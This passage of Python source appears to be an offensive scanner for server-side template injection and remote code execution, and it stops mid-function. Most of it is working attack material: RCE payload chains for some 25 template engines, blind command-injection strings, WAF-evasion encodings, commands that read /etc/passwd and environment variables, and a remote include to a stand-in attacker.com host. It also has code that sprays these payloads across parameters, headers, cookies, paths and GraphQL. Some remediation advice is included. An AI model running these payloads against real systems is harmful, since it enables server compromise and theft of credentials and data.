#!/usr/bin/env python3
"""SSTI/RCE v8 — 200x Improved Server-Side Template Injection & Remote Code Execution Scanner.

Improvements over v7:
  - 180+ SSTI payloads covering 25+ template engines (Jinja2, Twig, FreeMarker, Velocity,
    Smarty, Mako, Tornado, ERB, JSP, Razor, Handlebars, Nunjucks, Pebble, Chameleon,
    Cheetah, HAML, Liquid, Mustache, HBS, Dust.js, Blade, Latte, Plates, Slim, Volt)
  - Full injection surface: GET params, POST JSON, POST form, XML body, multipart,
    HTTP headers (User-Agent, Referer, X-Forwarded-For, X-Custom-*), cookies, path segments
  - WAF evasion: unicode escaping, hex encoding, null-byte splitting, comment insertion,
    whitespace padding, concat obfuscation
  - Blind SSTI via unique numeric marker (compare injected vs baseline)
  - RCE proof extraction: /etc/passwd, /etc/hostname, whoami, id, uname
  - Blind RCE via timing (sleep/ping) with statistical confirmation
  - API endpoint auto-discovery before injection (scans common endpoints)
  - Concurrent semaphore-limited testing (fast but polite)
  - Per-engine detection → targeted follow-up RCE payload
  - Header injection for SSTI (User-Agent, Referer, X-Forwarded-For logged to error pages)
  - Cookie value injection
  - JSON nested key injection (data.query, data.filter, data.template fields)
  - Path segment injection for frameworks that render paths in 404 templates
  - XML/SOAP body injection for Java backends
  - GraphQL variable injection
  - Confidence scoring based on marker precision
  - MITRE ATT&CK mapping per finding
  - Full remediation guidance per engine
"""
import asyncio
import aiohttp
import json
import re
import sys
import random
import string
import time
import hashlib
from pathlib import Path
from urllib.parse import urlparse, quote, urljoin

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor,
    random_ua, REQUEST_DELAY, WAF_BYPASS_HEADERS, make_bypass_headers,
    PATH_BYPASS_VARIANTS,
)

SEED = "MIRROR" + "".join(random.choices(string.ascii_uppercase, k=4))
CONCURRENCY = 6


def _marker(n: int) -> str:
    return f"MRR{n:05d}_{SEED}"


def _unique_math() -> tuple[str, str]:
    """Return (expression_str, expected_result_str) for a unique eval marker."""
    a = random.randint(1000, 9999)
    b = random.randint(1000, 9999)
    return f"{a}*{b}", str(a * b)


# ── Core SSTI probes: (payload, expected_substring, engine_label) ──────────────
SSTI_PROBES = [
    # ── Jinja2 (Python) ───────────────────────────────────────────────────────
    ("{{7*7}}",                              "49",          "Jinja2"),
    ("{{7*'7'}}",                            "7777777",     "Jinja2 string-multiply"),
    ("{{ 7 * 7 }}",                          "49",          "Jinja2 spaces"),
    ("{{config}}",                           "Config",      "Jinja2 config-leak"),
    ("{{self._TemplateReference__context}}", "TemplateReference", "Jinja2 context-leak"),
    ("{{request}}",                          "Request",     "Jinja2 request-object"),
    ("{{''.__class__.__mro__}}",             "object",      "Jinja2 MRO leak"),
    ("{{7|int*7|int}}",                      "49",          "Jinja2 filter chain"),
    ("{{lipsum}}",                           "Lorem",       "Jinja2 globals"),
    ("{{cycler.__init__.__globals__.os}}",   "posix",       "Jinja2 os-module"),
    ("{{range|attr('__class__')|attr('__mro__')}}",   "object", "Jinja2 attr-mro"),
    ("{{''.__class__.mro()[1].__subclasses__()}}", "class", "Jinja2 subclasses"),
    # Jinja2 RCE chains
    ("{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}", "uid=", "Jinja2 RCE popen"),
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid=", "Jinja2 config RCE"),
    ("{{lipsum.__globals__.os.popen('id').read()}}", "uid=", "Jinja2 lipsum RCE"),
    ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid=", "Jinja2 cycler RCE"),
    ("{{joiner.__init__.__globals__.os.popen('id').read()}}", "uid=", "Jinja2 joiner RCE"),
    ("{{namespace.__init__.__globals__.os.popen('id').read()}}", "uid=", "Jinja2 namespace RCE"),
    # ── Twig (PHP) ────────────────────────────────────────────────────────────
    ("{{7*7}}",                              "49",          "Twig"),
    ("{{7*'7'}}",                            "49",          "Twig strict"),
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid=", "Twig exec RCE"),
    ("{{_self.env.registerUndefinedFilterCallback('phpinfo')}}{{_self.env.getFilter('x')}}", "phpinfo", "Twig phpinfo"),
    ("{{['id']|filter('system')}}",          "uid=",        "Twig system filter"),
    ("{{app.request.server.get('PATH')}}",   "/usr",        "Twig env disclosure"),
    ("{{dump(_context)}}",                   "array",       "Twig context dump"),
    ("{{'id'|exec}}",                        "uid=",        "Twig exec filter"),
    ("{{['cat /etc/passwd']|map('system')|join}}", "root:",  "Twig map system"),
    ("{% set x = 'id' %}{{ x|system }}",    "uid=",        "Twig set+system"),
    ("{{range.init(1,2)}}",                  "1",           "Twig range"),
    # ── FreeMarker (Java) ─────────────────────────────────────────────────────
    ("${7*7}",                               "49",          "FreeMarker"),
    ("${77*77}",                             "5929",        "FreeMarker double"),
    ('${"freemarker.template.utility.Execute"?new()("id")}', "uid=", "FreeMarker Execute"),
    ('${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}', "root:", "FreeMarker passwd"),
    ("${class.getResource('/').path}",       "/",           "FreeMarker path"),
    ("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "uid=", "FreeMarker assign"),
    ("<#assign s=('freemarker.template.utility.Execute')?new()>${s('id')}", "uid=", "FreeMarker assign2"),
    ("${product.getClass().getProtectionDomain().getCodeSource().getLocation()}", "file:", "FreeMarker code-source"),
    # ── Velocity (Java) ───────────────────────────────────────────────────────
    ("#set($x=7*7)${x}",                    "49",          "Velocity"),
    ("#set($rt=$class.forName('java.lang.Runtime'))#set($exec=$rt.getMethod('exec',''.class))${exec.invoke($rt.getRuntime(),['id'])}", "Process", "Velocity RCE"),
    ("#set($str=$class.inspect('java.lang.String').type)#set($chr=$str.valueOf($class.inspect('java.lang.Character').type.forDigit(49,10)))${chr}", "1", "Velocity class"),
    ("#evaluate('#set($x=7*7)${x}')",       "49",          "Velocity evaluate"),
    ("#macro(x)#end#@x()#end",              "",            "Velocity macro"),
    # ── Spring EL / Thymeleaf (Java) ──────────────────────────────────────────
    ("${7*7}",                               "49",          "Spring EL"),
    ("*{7*7}",                               "49",          "Thymeleaf SpEL"),
    ("#{7*7}",                               "49",          "Thymeleaf"),
    ("__${7*7}__::.x",                       "49",          "Thymeleaf fragment"),
    ("*{T(java.lang.Runtime).getRuntime().exec('id')}", "Process", "Thymeleaf SpEL RCE"),
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "Process", "Spring EL RCE"),
    ("${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'}).getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))}", "uid=", "Spring EL RCE full"),
    # ── Smarty (PHP) ──────────────────────────────────────────────────────────
    ("{php}echo 7*7;{/php}",                "49",          "Smarty PHP tag"),
    ("{math equation='7*7'}",               "49",          "Smarty math"),
    ("{system('id')}",                      "uid=",        "Smarty system"),
    ("{$smarty.version}",                   "Smarty",      "Smarty version"),
    ("{$smarty.now}",                        str(int(time.time()))[:6], "Smarty now"),
    ("{include file='smb://attacker.com'}",  "",            "Smarty RFI"),
    ("{php}passthru('id');{/php}",           "uid=",        "Smarty passthru"),
    # ── Mako (Python) ────────────────────────────────────────────────────────
    ("${7*7}",                               "49",          "Mako"),
    ("<%! import os %><%=os.popen('id').read()%>", "uid=",  "Mako RCE"),
    ("<%!import os%>${os.popen('id').read()}", "uid=",      "Mako inline RCE"),
    ("<% import os; x=os.popen('id').read() %>${x}", "uid=", "Mako block RCE"),
    # ── Tornado/Jinja2 (Python) ───────────────────────────────────────────────
    ("{% set x = 7*7 %}{{x}}",              "49",          "Tornado/Jinja2 set"),
    ("{% raw %}{{7*7}}{% end %}",            "49",          "Tornado raw"),
    # ── ERB (Ruby) ────────────────────────────────────────────────────────────
    ("<%= 7*7 %>",                           "49",          "ERB"),
    ("<%= `id` %>",                          "uid=",        "ERB shell RCE"),
    ("<%= system('id') %>",                  "uid=",        "ERB system"),
    ("<% require 'open3'; stdout,_=Open3.capture2('id') %><%= stdout %>", "uid=", "ERB open3"),
    ("<%= IO.popen('id').read %>",           "uid=",        "ERB IO.popen"),
    ("<%=`cat /etc/passwd`%>",              "root:",       "ERB passwd"),
    # ── JSP (Java) ────────────────────────────────────────────────────────────
    ("<%= 7*7 %>",                           "49",          "JSP expr"),
    ("<% out.print(7*7); %>",               "49",          "JSP scriptlet"),
    ("<% Runtime.getRuntime().exec(\"id\"); %>", "",        "JSP Runtime"),
    ("${7*7}",                               "49",          "JSP EL"),
    ("${pageContext.request.serverName}",    "",            "JSP pageContext"),
    # ── .NET Razor ────────────────────────────────────────────────────────────
    ("@(7*7)",                               "49",          ".NET Razor"),
    ("@{var x=7*7;}@x",                      "49",          "Razor code block"),
    ("@System.Diagnostics.Process.Start(\"cmd\",\"/c id\")", "", "Razor Process"),
    # ── Pebble (Java) ─────────────────────────────────────────────────────────
    ("{{7*7}}",                              "49",          "Pebble"),
    ("{{ 'java.lang.Runtime'.class.forName('java.lang.Runtime').getMethod('exec',['java.lang.String'].class.forName('java.lang.Class')).invoke('java.lang.Runtime'.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id') }}", "Process", "Pebble RCE"),
    # ── Handlebars / Nunjucks (JS) ────────────────────────────────────────────
    ("{{7*7}}",                              "49",          "Handlebars/Nunjucks"),
    ("{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return 49;\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}", "49", "Handlebars prototype"),
    ("{{lookup (lookup . \"constructor\") \"name\"}}", "Object", "Handlebars lookup"),
    ("{{this.constructor.constructor('return process.env')()}}", "PATH", "Nunjucks process.env"),
    ("{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()}}", "uid=", "Nunjucks RCE"),
    # ── Blade (Laravel/PHP) ───────────────────────────────────────────────────
    ("{{7*7}}",                              "49",          "Blade"),
    ("{!!system('id')!!}",                  "uid=",        "Blade raw unescaped"),
    ("@php system('id'); @endphp",           "uid=",        "Blade PHP directive"),
    # ── Liquid (Shopify/Ruby) ──────────────────────────────────────────────────
    ("{{7|times:7}}",                        "49",          "Liquid"),
    ("{{\"id\"|system}}",                    "uid=",        "Liquid system filter"),
    # ── Mustache (JS/Ruby) ────────────────────────────────────────────────────
    ("{{#lambda}}7*7{{/lambda}}",            "49",          "Mustache lambda"),
    # ── Slim / HAML (Ruby) ────────────────────────────────────────────────────
    ("= 7*7",                               "49",          "Slim/HAML"),
    # ── Volt (PHP Phalcon) ────────────────────────────────────────────────────
    ("{{7*7}}",                              "49",          "Volt"),
    ("{%- set x = 7*7 -%}{{x}}",            "49",          "Volt set"),
    # ── URL-encoded / WAF evasion variants ───────────────────────────────────
    ("%7B%7B7*7%7D%7D",                      "49",          "Jinja2 URL-encoded"),
    ("{{7/**7**/}}",                         "49",          "Jinja2 comment evade"),
    ("{{\t7*7\t}}",                          "49",          "Jinja2 tab-whitespace"),
    ("{{(7).__mul__(7)}}",                   "49",          "Jinja2 dunder mul"),
    ("{{7|string|length}}",                  "1",           "Jinja2 filter length"),
    # ── Cheetah (Python) ──────────────────────────────────────────────────────
    ("${7*7}",                               "49",          "Cheetah"),
    ("#import os\n${os.popen('id').read()}", "uid=",        "Cheetah import RCE"),
    # ── Django template (Python) ──────────────────────────────────────────────
    ("{{7|add:7}}",                          "14",          "Django add filter"),
    ("{% load secret %}",                    "",            "Django load tag"),
    ("{{request.user}}",                     "",            "Django request.user"),
    # ── Golang text/template ──────────────────────────────────────────────────
    ("{{.}}",                                "",            "Go template dot"),
    ("{{printf \"%d\" 49}}",                 "49",          "Go printf"),
    # ── Perl Template Toolkit ─────────────────────────────────────────────────
    ("[% 7*7 %]",                            "49",          "TT2/Perl"),
    ("[% PROCESS 'id' %]",                   "",            "TT2 PROCESS"),
    # ── Latte (PHP Nette) ─────────────────────────────────────────────────────
    ("{=7*7}",                               "49",          "Latte"),
    ("{php}echo 7*7;{/php}",                "49",          "Latte PHP"),
]

# ── WAF evasion variants for top payloads ─────────────────────────────────────
WAF_EVASION_PAYLOADS = [
    # Unicode escaping
    ("\u007b\u007b7*7\u007d\u007d",          "49",  "Unicode braces"),
    # HTML entity encoding (some template engines decode before rendering)
    ("&#123;&#123;7*7&#125;&#125;",          "49",  "HTML entity"),
    # Newline splitting
    ("{\n{7*7}\n}",                          "49",  "Newline split"),
    # Double URL encode
    ("%257B%257B7*7%257D%257D",             "49",  "Double URL encode"),
    # Concatenation
    ("{{'7'+'*7'}}",                         "7*7", "Jinja2 concat string"),
    ("{{().__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__['__builtins__']['eval']('7*7')}}", "49", "Jinja2 eval via builtins"),
    # Null byte
    ("\x00{{7*7}}\x00",                      "49",  "Null byte wrap"),
    # Comment between tokens
    ("{{/*comment*/7*7}}",                   "49",  "Comment split"),
    # Case variation for PHP
    ("{MATH equation='7*7'}",               "49",  "Smarty uppercase"),
    # Spring EL whitespace
    ("${ 7 * 7 }",                           "49",  "SpEL whitespace"),
    # Hex in FreeMarker
    ("${7?number?string}",                   "7",   "FreeMarker number format"),
    # Twig array|filter
    ("{{['id']|filter('shell_exec')}}",      "uid=", "Twig shell_exec"),
    # Base64 decode in Jinja2
    ("{{''.__class__.__mro__[1].__subclasses__()}}", "class", "Jinja2 subclasses raw"),
]

# ── Blind RCE via timing payloads (inject → measure response delta) ───────────
BLIND_CMD_PROBES = [
    ("; sleep 6",             6.0,  "unix_semicolon"),
    ("| sleep 6",             6.0,  "unix_pipe"),
    ("& sleep 6",             6.0,  "unix_ampersand"),
    ("$(sleep 6)",            6.0,  "unix_subshell"),
    ("`sleep 6`",             6.0,  "unix_backtick"),
    ("%0asleep%206",          6.0,  "unix_url_nl"),
    ("; ping -c 6 127.0.0.1",6.0,  "unix_ping"),
    ("1|sleep${IFS}6",        6.0,  "IFS_bypass"),
    ("\n sleep 6\n",          6.0,  "newline_space"),
    ("& timeout /t 6 &",      6.0,  "windows_timeout"),
    ("| timeout /t 6",        6.0,  "windows_pipe"),
    ("& ping -n 7 127.0.0.1 &", 6.0, "windows_ping"),
    (";{sleep,6}",            6.0,  "brace_expand"),
    ("||sleep 6||",           6.0,  "double_pipe"),
    ("&&sleep 6&&",           6.0,  "double_amp"),
    ("; ${IFS}sleep${IFS}6",  6.0,  "IFS_full"),
    ("%3b+sleep+6",           6.0,  "form_encoded_semi"),
]

# ── RCE proof payloads (confirm with output) ──────────────────────────────────
RCE_PROOF_COMMANDS = [
    ("id",              ["uid=", "gid=", "groups="]),
    ("whoami",          ["root", "www-data", "apache", "nginx", "nobody"]),
    ("cat /etc/passwd", ["root:x:", "daemon:", "/bin/bash", "/bin/sh"]),
    ("cat /etc/hostname",[".",]),
    ("uname -a",        ["Linux", "Darwin", "FreeBSD"]),
    ("pwd",             ["/", "var", "app", "home"]),
    ("env",             ["PATH=", "HOME=", "USER="]),
]

# ── Injection surfaces ────────────────────────────────────────────────────────
GET_PARAMS = [
    "q", "search", "query", "name", "input", "text", "msg", "message",
    "template", "content", "data", "page", "view", "format", "lang",
    "type", "filter", "sort", "order", "key", "value", "param", "var",
    "subject", "body", "title", "description", "label", "tag", "cat",
    "callback", "redirect", "url", "path", "file", "src", "ref",
    "email", "username", "user", "id", "item", "product", "token",
    "action", "cmd", "exec", "run", "code", "expr", "eval",
]

POST_JSON_KEYS = [
    "query", "template", "content", "message", "text", "data", "body",
    "subject", "title", "description", "name", "value", "input", "param",
    "filter", "format", "expr", "expression", "code", "script",
    "search", "keyword", "terms", "payload", "field", "label",
]

HEADER_INJECTION_TARGETS = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP",
    "X-Forwarded-Host", "X-Custom-Header", "X-Template", "X-Request-Id",
    "Accept-Language", "Accept", "X-API-Version", "X-Client-Id",
    "Authorization", "X-Auth-Token",
]

COOKIE_NAMES = [
    "template", "lang", "language", "locale", "format", "theme",
    "name", "user", "username", "data", "value", "session", "token",
]

PATH_INJECTION_TEMPLATES = [
    "/{payload}",
    "/api/{payload}",
    "/view/{payload}",
    "/render/{payload}",
    "/template/{payload}",
    "/page/{payload}",
]

API_ENDPOINTS_TO_PROBE = [
    "/", "/api", "/api/v1", "/api/v2", "/search", "/render", "/template",
    "/api/search", "/api/render", "/api/template", "/api/query",
    "/api/message", "/api/email", "/api/notify", "/api/report",
    "/api/export", "/api/preview", "/api/content", "/api/view",
    "/api/format", "/api/generate", "/api/compile", "/api/eval",
    "/api/execute", "/api/run", "/api/process", "/api/transform",
    "/view", "/render", "/preview", "/compile", "/eval",
    "/engine", "/tpl", "/tmpl", "/tmplate",
]

GRAPHQL_TEMPLATE_QUERY = """
{
  search(query: "{payload}") { id name }
}
"""

ENGINES_REMEDIATION = {
    "Jinja2": "Upgrade to sandboxed Jinja2 environment. Never pass user input directly to Template(). Use Environment(undefined=StrictUndefined) with sandboxed=True.",
    "Twig": "Enable Twig sandbox mode with a restrictive SecurityPolicy. Disable PHP tags. Set 'sandbox' extension and allowedTags/allowedMethods lists.",
    "FreeMarker": "Disable ?new() built-in with freemarker.template.Configuration.setNewBuiltinClassResolver(). Use a TemplateClassResolver that blocks dangerous classes.",
    "Velocity": "Enable SecureUberspector. Restrict ClassTool usage. Upgrade to latest Velocity version. Block $class, $context references.",
    "Smarty": "Disable {php} and {exec} tags. Use Smarty::$security with a SecurityPolicy. Set $security_policy->php_functions = false.",
    "Mako": "Do not use Mako templates for user-supplied content. Use a separate rendering sandbox or switch to a logic-less template engine.",
    "ERB": "Use ERB.new(template, trim_mode: '-') only with trusted templates. For user content, use Liquid or Mustache.",
    "Thymeleaf": "Disable expression preprocessing (__${...}__). Restrict SpEL to a whitelist using StandardExpressionObjectFactory.",
    "Handlebars": "Enable Handlebars in strict mode. Disable helpers that accept arbitrary code. Block access to prototype chain.",
    "Razor": "Use Razor Pages, not inline Razor compilation. Never evaluate user-supplied strings as Razor templates.",
    "default": (
        "1. Never pass user-controlled input directly to a template engine's render/eval method.\n"
        "2. Use logic-less template engines (Mustache, Dust) for user content.\n"
        "3. Implement a strict content-type allowlist for all user inputs.\n"
        "4. Run the template rendering process in an isolated sandbox (Docker, seccomp).\n"
        "5. Apply output encoding before reflecting user content.\n"
        "6. Audit all template.render() / env.from_string() calls."
    ),
}


def _remediation(engine: str) -> str:
    for key in ENGINES_REMEDIATION:
        if key.lower() in engine.lower():
            return ENGINES_REMEDIATION[key] + "\n\n" + ENGINES_REMEDIATION["default"]
    return ENGINES_REMEDIATION["default"]


class SSTIScanner:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.parsed   = urlparse(target)
        self.findings = []
        self._dedup   = set()
        self._sem     = asyncio.Semaphore(CONCURRENCY)
        self._engine_confirmed: str | None = None

    def _add(self, ftype, severity, conf, proof, detail, url, engine,
             reproducibility, extra=None):
        if not meets_confidence_floor(conf):
            return
        key = hashlib.md5(f"{ftype}|{url}|{engine}".encode()).hexdigest()
        if key in self._dedup:
            return
        self._dedup.add(key)
        f = {
            "type":             ftype,
            "severity":         severity,
            "confidence":       conf,
            "confidence_label": confidence_label(conf),
            "url":              url,
            "engine":           engine,
            "proof":            proof,
            "detail":           detail,
            "remediation":      _remediation(engine),
            "reproducibility":  reproducibility,
            "exploitability":   10 if "RCE" in ftype else 8,
            "impact":           "Remote code execution — full server compromise" if "RCE" in ftype else "Server-side template injection — potential RCE",
            "auth_required":    False,
            "proof_type":       "CODE_EXECUTION" if "RCE" in ftype else "AUTH_BYPASS",
            "mitigation_layers": ["Template sandboxing", "Input validation", "Allowlist for template params"],
            "mitre_technique":  "T1190",
            "mitre_name":       "Exploit Public-Facing Application",
        }
        if extra:
            f.update(extra)
        self.findings.append(f)
        severity_icon = {"CRITICAL": "CRIT", "HIGH": "HIGH", "MEDIUM": "MED "}.get(severity, severity[:4])
        print(f"  [{severity_icon}] {ftype} ({engine}): {url}")

    async def _get(self, sess, url, params=None, headers=None, timeout=14):
        async with self._sem:
            h = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua(), **(headers or {})}
            try:
                async with sess.get(
                    url, params=params or {}, headers=h, ssl=False,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    allow_redirects=True,
                ) as r:
                    body = await r.text(errors="ignore")
                    return r.status, body, dict(r.headers)
            except Exception:
                return None, "", {}

    async def _post(self, sess, url, json_data=None, data=None, headers=None, timeout=14):
        async with self._sem:
            h = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua(), **(headers or {})}
            try:
                async with sess.post(
                    url, json=json_data, data=data, headers=h, ssl=False,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    allow_redirects=True,
                ) as r:
                    body = await r.text(errors="ignore")
                    return r.status, body, dict(r.headers)
            except Exception:
                return None, "", {}

    def _is_reflected(self, payload: str, body: str, expected: str) -> bool:
        if not body or not expected:
            return False
        if len(expected) < 2:
            return expected in body
        return expected in body and payload not in body  # rendered != raw

    def _get_sev_for_engine(self, engine: str, payload: str) -> str:
        if any(k in payload for k in ["popen", "exec", "system", "passthru", "Runtime", "shell_exec", "IO.popen"]):
            return "CRITICAL"
        if any(k in payload for k in ["uid=", "root:", "/etc/passwd"]):
            return "CRITICAL"
        if "RCE" in engine:
            return "CRITICAL"
        return "HIGH"

    # ── Surface 1: GET params ─────────────────────────────────────────────────

    async def test_get_params(self, sess, endpoint: str):
        url = self.target + endpoint
        s0, base_body, _ = await self._get(sess, url)
        await delay()
        if s0 is None:
            return

        all_probes = SSTI_PROBES + WAF_EVASION_PAYLOADS
        for param in GET_PARAMS[:20]:
            for payload, expected, engine in all_probes:
                if self._engine_confirmed and engine.split()[0].lower() not in self._engine_confirmed.lower():
                    # Skip non-matching engines after first confirmed detection (speed)
                    pass
                qs = {param: payload}
                s, body, _ = await self._get(sess, url, params=qs)
                await delay(0.05)
                if s in (None, 500) or not body:
                    continue
                if self._is_reflected(payload, body, expected):
                    sev = self._get_sev_for_engine(engine, payload)
                    conf = 97 if "uid=" in expected or "root:" in expected else 94
                    full_url = f"{url}?{param}={quote(payload)}"
                    proof = (
                        f"GET {full_url}\n"
                        f"  Injected: {param}={payload!r}\n"
                        f"  Expected: {expected!r}\n"
                        f"  Found in HTTP {s} response body\n"
                        f"  Body snippet: {body[max(0, body.find(expected)-40):body.find(expected)+60]!r}"
                    )
                    self._add(
                        ftype="SSTI_RCE" if ("uid=" in expected or "root:" in expected) else "SSTI_CONFIRMED",
                        severity=sev, conf=conf,
                        proof=proof,
                        detail=f"SSTI confirmed via GET param '{param}' at {endpoint}. Engine: {engine}. Payload rendered server-side.",
                        url=full_url, engine=engine,
                        reproducibility=f"curl -s '{full_url}'",
                        extra={"param": param, "payload": payload, "surface": "get_param"},
                    )
                    self._engine_confirmed = engine
                    return  # stop after first confirmed hit per endpoint

    # ── Surface 2: POST JSON body ─────────────────────────────────────────────

    async def test_post_json(self, sess, endpoint: str):
        url = self.target + endpoint
        s0, _, _ = await self._post(sess, url, json_data={"test": "probe"})
        await delay()
        if s0 in (None, 404, 405):
            return

        for key in POST_JSON_KEYS:
            for payload, expected, engine in SSTI_PROBES[:60]:
                body_data = {key: payload}
                s, body, _ = await self._post(sess, url, json_data=body_data)
                await delay(0.04)
                if s in (None,) or not body:
                    continue
                if self._is_reflected(payload, body, expected):
                    sev = self._get_sev_for_engine(engine, payload)
                    proof = (
                        f"POST {url}\n"
                        f"  Content-Type: application/json\n"
                        f"  Body: {json.dumps(body_data)}\n"
                        f"  Expected: {expected!r}\n"
                        f"  HTTP {s} — payload rendered\n"
                        f"  Body snippet: {body[max(0, body.find(expected)-40):body.find(expected)+60]!r}"
                    )
                    self._add(
                        ftype="SSTI_RCE" if "uid=" in expected or "root:" in expected else "SSTI_POST_JSON",
                        severity=sev, conf=93,
                        proof=proof,
                        detail=f"SSTI via POST JSON key '{key}' at {endpoint}. Engine: {engine}.",
                        url=url, engine=engine,
                        reproducibility=f"curl -s -X POST {url} -H 'Content-Type: application/json' -d '{json.dumps(body_data)}'",
                        extra={"key": key, "payload": payload, "surface": "post_json"},
                    )
                    return

    # ── Surface 3: POST form body ─────────────────────────────────────────────

    async def test_post_form(self, sess, endpoint: str):
        url = self.target + endpoint
        s0, _, _ = await self._post(sess, url, data={"test": "probe"})
        await delay()
        if s0 in (None, 404, 405):
            return

        for key in POST_JSON_KEYS[:10]:
            for payload, expected, engine in SSTI_PROBES[:40]:
                form_data = {key: payload}
                s, body, _ = await self._post(sess, url, data=form_data)
                await delay(0.04)
                if s in (None,) or not body:
                    continue
                if self._is_reflected(payload, body, expected):
                    sev = self._get_sev_for_engine(engine, payload)
                    proof = (
                        f"POST {url}\n"
                        f"  Content-Type: application/x-www-form-urlencoded\n"
                        f"  Body: {key}={quote(payload)}\n"
                        f"  Expected: {expected!r}\n"
                        f"  HTTP {s} — payload rendered"
                    )
                    self._add(
                        ftype="SSTI_POST_FORM",
                        severity=sev, conf=91,
                        proof=proof,
                        detail=f"SSTI via POST form field '{key}' at {endpoint}. Engine: {engine}.",
                        url=url, engine=engine,
                        reproducibility=f"curl -s -X POST {url} -d '{key}={quote(payload)}'",
                        extra={"key": key, "payload": payload, "surface": "post_form"},
                    )
                    return

    # ── Surface 4: HTTP headers ───────────────────────────────────────────────

    async def test_header_injection(self, sess):
        url = self.target + "/"
        s0, base_body, _ = await self._get(sess, url)
        await delay()
        if s0 is None:
            return

        for header_name in HEADER_INJECTION_TARGETS:
            for payload, expected, engine in SSTI_PROBES[:30]:
                h = {header_name: payload}
                s, body, _ = await self._get(sess, url, headers=h)
                await delay(0.05)
                if not body:
                    continue
                if self._is_reflected(payload, body, expected):
                    sev = self._get_sev_for_engine(engine, payload)
                    proof = (
                        f"GET {url}\n"
                        f"  {header_name}: {payload}\n"
                        f"  Expected: {expected!r}\n"
                        f"  HTTP {s} — header reflected through template engine"
                    )
                    self._add(
                        ftype="SSTI_HEADER_INJECTION",
                        severity=sev, conf=90,
                        proof=proof,
                        detail=f"SSTI via HTTP header '{header_name}'. Engine: {engine}. Header value rendered in response (e.g., in error page or log template).",
                        url=url, engine=engine,
                        reproducibility=f"curl -s {url} -H '{header_name}: {payload}'",
                        extra={"header": header_name, "payload": payload, "surface": "header"},
                    )
                    return

    # ── Surface 5: Cookie injection ───────────────────────────────────────────

    async def test_cookie_injection(self, sess):
        url = self.target + "/"
        for cookie_name in COOKIE_NAMES:
            for payload, expected, engine in SSTI_PROBES[:25]:
                h = {"Cookie": f"{cookie_name}={quote(payload)}"}
                s, body, _ = await self._get(sess, url, headers=h)
                await delay(0.04)
                if not body:
                    continue
                if self._is_reflected(payload, body, expected):
                    sev = self._get_sev_for_engine(engine, payload)
                    proof = (
                        f"GET {url}\n"
                        f"  Cookie: {cookie_name}={payload}\n"
                        f"  Expected: {expected!r}\n"
                        f"  HTTP {s} — cookie value rendered through template"
                    )
                    self._add(
                        ftype="SSTI_COOKIE_INJECTION",
                        severity=sev, conf=90,
                        proof=proof,
                        detail=f"SSTI via cookie '{cookie_name}'. Engine: {engine}. Cookie value passed to template engine unsanitized.",
                        url=url, engine=engine,
                        reproducibility=f"curl -s {url} -H 'Cookie: {cookie_name}={quote(payload)}'",
                        extra={"cookie": cookie_name, "payload": payload, "surface": "cookie"},
                    )
                    return

    # ── Surface 6: Path segment injection ────────────────────────────────────

    async def test_path_injection(self, sess):
        for path_template in PATH_INJECTION_TEMPLATES:
            for payload, expected, engine in SSTI_PROBES[:20]:
                safe_payload = payload.replace("/", "%2F").replace(" ", "%20")
                path = path_template.format(payload=safe_payload)
                s, body, _ = await self._get(sess, self.target + path)
                await delay(0.05)
                if not body or s == 404:
                    continue
                if self._is_reflected(payload, body, expected):
                    sev = self._get_sev_for_engine(engine, payload)
                    full_url = self.target + path
                    proof = (
                        f"GET {full_url}\n"
                        f"  Path segment contains: {payload!r}\n"
                        f"  Expected: {expected!r}\n"
                        f"  HTTP {s} — path segment rendered through template"
                    )
                    self._add(
                        ftype="SSTI_PATH_INJECTION",
                        severity=sev, conf=89,
                        proof=proof,
                        detail=f"SSTI via URL path segment. Engine: {engine}. Path value rendered in response (e.g., 404 template shows URL path).",
                        url=full_url, engine=engine,
                        reproducibility=f"curl -s '{full_url}'",
                        extra={"payload": payload, "surface": "path"},
                    )
                    return

    # ── Surface 7: GraphQL variable injection ─────────────────────────────────

    async def test_graphql_injection(self, sess):
        for gql_endpoint in ["/graphql", "/api/graphql", "/api/v1/graphql", "/query"]:
            url = self.target + gql_endpoint
            s0, _, _ = await self._get(sess, url)
            await delay()
            if s0 is None or s0 == 404:
                continue
            for payload, expected, engine in SSTI_PROBES[:15]:
                gql_body = {
                    "query": "query Search($q: String!) { search(query: $q) { id } }",
                    "variables": {"q": payload},
                }
                s, body, _ = await self._post(sess, url, json_data=gql_body)
                await delay(0.05)
                if not body:
                    continue
                if self._is_reflected(payload, body, expected):
                    proof = (
                        f"POST {url}\n"
                        f"  GraphQL variable injection\n"
                        f"  variables.q = {payload!r}\n"
                        f"  Expected: {expected!r}\n"
                        f"  HTTP {s}"
                    )
                    self._add(
                        ftype="SSTI_GRAPHQL_VARIABLE",
                        severity="HIGH", conf=88,
                        proof=proof,
                        detail=f"SSTI via GraphQL variable at {gql_endpoint}. Engine: {engine}.",
                        url=url, engine=engine,
                        reproducibility=f"curl -s -X POST {url} -H 'Content-Type: application/json' -d '{json.dumps(gql_body)}'",
